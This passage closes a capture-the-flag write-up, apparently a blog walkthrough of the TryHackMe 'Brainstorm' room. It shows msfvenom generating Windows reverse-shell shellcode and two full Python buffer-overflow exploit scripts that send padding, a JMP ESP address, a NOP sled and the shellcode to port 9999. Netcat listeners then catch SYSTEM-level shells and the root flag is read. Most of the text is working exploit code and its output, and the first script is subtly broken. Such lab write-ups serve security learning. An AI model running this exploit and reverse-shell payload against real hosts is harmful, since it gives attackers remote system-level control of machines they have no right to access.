buf += b"\x84\x5d\x01\x8d\x7f\x29\x90\x47\x4e\xd2\x3f\xa6"
buf += b"\x7e\x21\x41\xef\xb9\xda\x34\x19\xba\x67\x4f\xde"
buf += b"\xc0\xb3\xda\xc4\x63\x37\x7c\x20\x95\x94\x1b\xa3"
buf += b"\x99\x51\x6f\xeb\xbd\x64\xbc\x80\xba\xed\x43\x46"
buf += b"\x4b\xb5\x67\x42\x17\x6d\x09\xd3\xfd\xc0\x36\x03"
buf += b"\x5e\xbc\x92\x48\x73\xa9\xae\x13\x1c\x1e\x83\xab"
buf += b"\xdc\x08\x94\xd8\xee\x97\x0e\x76\x43\x5f\x89\x81"
buf += b"\xa4\x4a\x6d\x1d\x5b\x75\x8e\x34\x98\x21\xde\x2e"
buf += b"\x09\x4a\xb5\xae\xb6\x9f\x1a\xfe\x18\x70\xdb\xae"
buf += b"\xd8\x20\xb3\xa4\xd6\x1f\xa3\xc7\x3c\x08\x4e\x32"
buf += b"\xd7\xf7\x27\x28\x33\x90\x35\x50\x3a\xdb\xb3\xb6"
buf += b"\x56\x0b\x92\x61\xcf\xb2\xbf\xf9\x6e\x3a\x6a\x84"
buf += b"\xb1\xb0\x99\x79\x7f\x31\xd7\x69\xe8\xb1\xa2\xd3"
buf += b"\xbf\xce\x18\x7b\x23\x5c\xc7\x7b\x2a\x7d\x50\x2c"
buf += b"\x7b\xb3\xa9\xb8\x91\xea\x03\xde\x6b\x6a\x6b\x5a"
buf += b"\xb0\x4f\x72\x63\x35\xeb\x50\x73\x83\xf4\xdc\x27"
buf += b"\x5b\xa3\x8a\x91\x1d\x1d\x7d\x4b\xf4\xf2\xd7\x1b"
buf += b"\x81\x38\xe8\x5d\x8e\x14\x9e\x81\x3f\xc1\xe7\xbe"
buf += b"\xf0\x85\xef\xc7\xec\x35\x0f\x12\xb5\x46\x5a\x3e"
buf += b"\x9c\xce\x03\xab\x9c\x92\xb3\x06\xe2\xaa\x37\xa2"
buf += b"\x9b\x48\x27\xc7\x9e\x15\xef\x34\xd3\x06\x9a\x3a"
buf += b"\x40\x26\x8f"
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=genpayload %}

<br />
Update the python code to use the payload we just generated.  Make sure to include the nop sled.

{% capture exploit08 %}
import socket
from struct import pack

ip = '192.168.20.24'
port = 9999

# baddies = \x00

buf =  b""
buf += b"\xbf\xbe\xc5\x39\x8c\xda\xd1\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x52\x31\x7a\x12\x83\xea\xfc\x03\xc4"
buf += b"\xcb\xdb\x79\xc4\x3c\x99\x82\x34\xbd\xfe\x0b\xd1"
buf += b"\x8c\x3e\x6f\x92\xbf\x8e\xfb\xf6\x33\x64\xa9\xe2"
buf += b"\xc0\x08\x66\x05\x60\xa6\x50\x28\x71\x9b\xa1\x2b"
buf += b"\xf1\xe6\xf5\x8b\xc8\x28\x08\xca\x0d\x54\xe1\x9e"
buf += b"\xc6\x12\x54\x0e\x62\x6e\x65\xa5\x38\x7e\xed\x5a"
buf += b"\x88\x81\xdc\xcd\x82\xdb\xfe\xec\x47\x50\xb7\xf6"
buf += b"\x84\x5d\x01\x8d\x7f\x29\x90\x47\x4e\xd2\x3f\xa6"
buf += b"\x7e\x21\x41\xef\xb9\xda\x34\x19\xba\x67\x4f\xde"
buf += b"\xc0\xb3\xda\xc4\x63\x37\x7c\x20\x95\x94\x1b\xa3"
buf += b"\x99\x51\x6f\xeb\xbd\x64\xbc\x80\xba\xed\x43\x46"
buf += b"\x4b\xb5\x67\x42\x17\x6d\x09\xd3\xfd\xc0\x36\x03"
buf += b"\x5e\xbc\x92\x48\x73\xa9\xae\x13\x1c\x1e\x83\xab"
buf += b"\xdc\x08\x94\xd8\xee\x97\x0e\x76\x43\x5f\x89\x81"
buf += b"\xa4\x4a\x6d\x1d\x5b\x75\x8e\x34\x98\x21\xde\x2e"
buf += b"\x09\x4a\xb5\xae\xb6\x9f\x1a\xfe\x18\x70\xdb\xae"
buf += b"\xd8\x20\xb3\xa4\xd6\x1f\xa3\xc7\x3c\x08\x4e\x32"
buf += b"\xd7\xf7\x27\x28\x33\x90\x35\x50\x3a\xdb\xb3\xb6"
buf += b"\x56\x0b\x92\x61\xcf\xb2\xbf\xf9\x6e\x3a\x6a\x84"
buf += b"\xb1\xb0\x99\x79\x7f\x31\xd7\x69\xe8\xb1\xa2\xd3"
buf += b"\xbf\xce\x18\x7b\x23\x5c\xc7\x7b\x2a\x7d\x50\x2c"
buf += b"\x7b\xb3\xa9\xb8\x91\xea\x03\xde\x6b\x6a\x6b\x5a"
buf += b"\xb0\x4f\x72\x63\x35\xeb\x50\x73\x83\xf4\xdc\x27"
buf += b"\x5b\xa3\x8a\x91\x1d\x1d\x7d\x4b\xf4\xf2\xd7\x1b"
buf += b"\x81\x38\xe8\x5d\x8e\x14\x9e\x81\x3f\xc1\xe7\xbe"
buf += b"\xf0\x85\xef\xc7\xec\x35\x0f\x12\xb5\x46\x5a\x3e"
buf += b"\x9c\xce\x03\xab\x9c\x92\xb3\x06\xe2\xaa\x37\xa2"
buf += b"\x9b\x48\x27\xc7\x9e\x15\xef\x34\xd3\x06\x9a\x3a"
buf += b"\x40\x26\x8f"

inputBuffer += b'A' * 2012
inputBuffer += pack('<L',(0x625014df))
inputBuffer += '\x90' * 16
inputBuffer += buf
inputBuffer += b'C' * 2500

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x08.py' content=exploit08 %}

<br />
Start a netcat listener.

{% capture start443listenerlocal %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start443listenerlocal %}

<br />
Run the script and catch the shell.

{% capture catchlocalshell %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ sudo nc -nlvp 443 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.20.20] from (UNKNOWN) [192.168.20.24] 50648
{% endcapture %}

{% capture windowslocalshell %}
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catchlocalshell %}

{% include terminal.html language='cmd' title='cmd.exe' content=windowslocalshell %}

<br />
Run msfvenom (again) to generate a payload with the TryHackMe IP address.

{% capture genremotepayload %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.119.29 LPORT=443 -f python -b '\x00'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1745 bytes
buf =  b""
buf += b"\xb8\x64\xc9\x13\xf9\xda\xc4\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x52\x83\xed\xfc\x31\x45\x0e\x03\x21"
buf += b"\xc7\xf1\x0c\x55\x3f\x77\xee\xa5\xc0\x18\x66\x40"
buf += b"\xf1\x18\x1c\x01\xa2\xa8\x56\x47\x4f\x42\x3a\x73"
buf += b"\xc4\x26\x93\x74\x6d\x8c\xc5\xbb\x6e\xbd\x36\xda"
buf += b"\xec\xbc\x6a\x3c\xcc\x0e\x7f\x3d\x09\x72\x72\x6f"
buf += b"\xc2\xf8\x21\x9f\x67\xb4\xf9\x14\x3b\x58\x7a\xc9"
buf += b"\x8c\x5b\xab\x5c\x86\x05\x6b\x5f\x4b\x3e\x22\x47"
buf += b"\x88\x7b\xfc\xfc\x7a\xf7\xff\xd4\xb2\xf8\xac\x19"
buf += b"\x7b\x0b\xac\x5e\xbc\xf4\xdb\x96\xbe\x89\xdb\x6d"
buf += b"\xbc\x55\x69\x75\x66\x1d\xc9\x51\x96\xf2\x8c\x12"
buf += b"\x94\xbf\xdb\x7c\xb9\x3e\x0f\xf7\xc5\xcb\xae\xd7"
buf += b"\x4f\x8f\x94\xf3\x14\x4b\xb4\xa2\xf0\x3a\xc9\xb4"
buf += b"\x5a\xe2\x6f\xbf\x77\xf7\x1d\xe2\x1f\x34\x2c\x1c"
buf += b"\xe0\x52\x27\x6f\xd2\xfd\x93\xe7\x5e\x75\x3a\xf0"
buf += b"\xa1\xac\xfa\x6e\x5c\x4f\xfb\xa7\x9b\x1b\xab\xdf"
buf += b"\x0a\x24\x20\x1f\xb2\xf1\xe7\x4f\x1c\xaa\x47\x3f"
buf += b"\xdc\x1a\x20\x55\xd3\x45\x50\x56\x39\xee\xfb\xad"
buf += b"\xaa\x1b\xf8\xda\x37\x74\x02\x24\x49\x3f\x8b\xc2"
buf += b"\x23\x2f\xda\x5d\xdc\xd6\x47\x15\x7d\x16\x52\x50"
buf += b"\xbd\x9c\x51\xa5\x70\x55\x1f\xb5\xe5\x95\x6a\xe7"
buf += b"\xa0\xaa\x40\x8f\x2f\x38\x0f\x4f\x39\x21\x98\x18"
buf += b"\x6e\x97\xd1\xcc\x82\x8e\x4b\xf2\x5e\x56\xb3\xb6"
buf += b"\x84\xab\x3a\x37\x48\x97\x18\x27\x94\x18\x25\x13"
buf += b"\x48\x4f\xf3\xcd\x2e\x39\xb5\xa7\xf8\x96\x1f\x2f"
buf += b"\x7c\xd5\x9f\x29\x81\x30\x56\xd5\x30\xed\x2f\xea"
buf += b"\xfd\x79\xb8\x93\xe3\x19\x47\x4e\xa0\x2a\x02\xd2"
buf += b"\x81\xa2\xcb\x87\x93\xae\xeb\x72\xd7\xd6\x6f\x76"
buf += b"\xa8\x2c\x6f\xf3\xad\x69\x37\xe8\xdf\xe2\xd2\x0e"
buf += b"\x73\x02\xf7"
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=genremotepayload %}

<br />
Update the script with the new payload and victim machine IP address.

{% capture exploit09 %}
import socket
from struct import pack

ip = '10.10.214.139'
port = 9999

# baddies = \x00

buf =  b""
buf += b"\xb8\x64\xc9\x13\xf9\xda\xc4\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x52\x83\xed\xfc\x31\x45\x0e\x03\x21"
buf += b"\xc7\xf1\x0c\x55\x3f\x77\xee\xa5\xc0\x18\x66\x40"
buf += b"\xf1\x18\x1c\x01\xa2\xa8\x56\x47\x4f\x42\x3a\x73"
buf += b"\xc4\x26\x93\x74\x6d\x8c\xc5\xbb\x6e\xbd\x36\xda"
buf += b"\xec\xbc\x6a\x3c\xcc\x0e\x7f\x3d\x09\x72\x72\x6f"
buf += b"\xc2\xf8\x21\x9f\x67\xb4\xf9\x14\x3b\x58\x7a\xc9"
buf += b"\x8c\x5b\xab\x5c\x86\x05\x6b\x5f\x4b\x3e\x22\x47"
buf += b"\x88\x7b\xfc\xfc\x7a\xf7\xff\xd4\xb2\xf8\xac\x19"
buf += b"\x7b\x0b\xac\x5e\xbc\xf4\xdb\x96\xbe\x89\xdb\x6d"
buf += b"\xbc\x55\x69\x75\x66\x1d\xc9\x51\x96\xf2\x8c\x12"
buf += b"\x94\xbf\xdb\x7c\xb9\x3e\x0f\xf7\xc5\xcb\xae\xd7"
buf += b"\x4f\x8f\x94\xf3\x14\x4b\xb4\xa2\xf0\x3a\xc9\xb4"
buf += b"\x5a\xe2\x6f\xbf\x77\xf7\x1d\xe2\x1f\x34\x2c\x1c"
buf += b"\xe0\x52\x27\x6f\xd2\xfd\x93\xe7\x5e\x75\x3a\xf0"
buf += b"\xa1\xac\xfa\x6e\x5c\x4f\xfb\xa7\x9b\x1b\xab\xdf"
buf += b"\x0a\x24\x20\x1f\xb2\xf1\xe7\x4f\x1c\xaa\x47\x3f"
buf += b"\xdc\x1a\x20\x55\xd3\x45\x50\x56\x39\xee\xfb\xad"
buf += b"\xaa\x1b\xf8\xda\x37\x74\x02\x24\x49\x3f\x8b\xc2"
buf += b"\x23\x2f\xda\x5d\xdc\xd6\x47\x15\x7d\x16\x52\x50"
buf += b"\xbd\x9c\x51\xa5\x70\x55\x1f\xb5\xe5\x95\x6a\xe7"
buf += b"\xa0\xaa\x40\x8f\x2f\x38\x0f\x4f\x39\x21\x98\x18"
buf += b"\x6e\x97\xd1\xcc\x82\x8e\x4b\xf2\x5e\x56\xb3\xb6"
buf += b"\x84\xab\x3a\x37\x48\x97\x18\x27\x94\x18\x25\x13"
buf += b"\x48\x4f\xf3\xcd\x2e\x39\xb5\xa7\xf8\x96\x1f\x2f"
buf += b"\x7c\xd5\x9f\x29\x81\x30\x56\xd5\x30\xed\x2f\xea"
buf += b"\xfd\x79\xb8\x93\xe3\x19\x47\x4e\xa0\x2a\x02\xd2"
buf += b"\x81\xa2\xcb\x87\x93\xae\xeb\x72\xd7\xd6\x6f\x76"
buf += b"\xa8\x2c\x6f\xf3\xad\x69\x37\xe8\xdf\xe2\xd2\x0e"
buf += b"\x73\x02\xf7"

inputBuffer = b'A' * 2012
inputBuffer += pack('<L',(0x625014df))
inputBuffer += b'\x90' * 16
inputBuffer += buf
inputBuffer += b'C' * 2500

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print('[*] Connecting to program')
    s.connect((ip,port))
    s.recv(1024)
    s.recv(1024)

    print('[*] Sending the payload')
    s.send(b'Scotti\r\n')
    s.recv(1024)

    s.sendall(inputBuffer + b'\r\n')

    print('[*] Check the listener')
    s.close()
except:
    print('[-] The exploit failed')
{% endcapture %}
{% include terminal.html language='python' title='brainstorm_0x09.py' content=exploit09 %}

<br />
Reset the listener.

{% capture reset443listener %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=reset443listener %}

<br />
Catch the listener and catch the shell.

{% capture catchremoteshell %}
┌──(kali㉿kali)-[~/Documents/thm/brainstorm]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.214.139] 49180
{% endcapture %}

{% capture windowsremoteshell %}
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catchremoteshell %}

{% include terminal.html language='cmd' title='cmd.exe' content=windowsremoteshell %}

<br />
Get the root.txt flag.

{% capture rootflag %}
C:\Users\drake\Desktop>type root.txt
type root.txt
<redacted>
C:\Users\drake\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::6d4e:88cf:3712:a624%13
   IPv4 Address. . . . . . . . . . . : 10.10.214.139
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
{% endcapture %}
{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}

<br />
And with that we wrapped up another one.  Thanks for reading.  See you in the next one.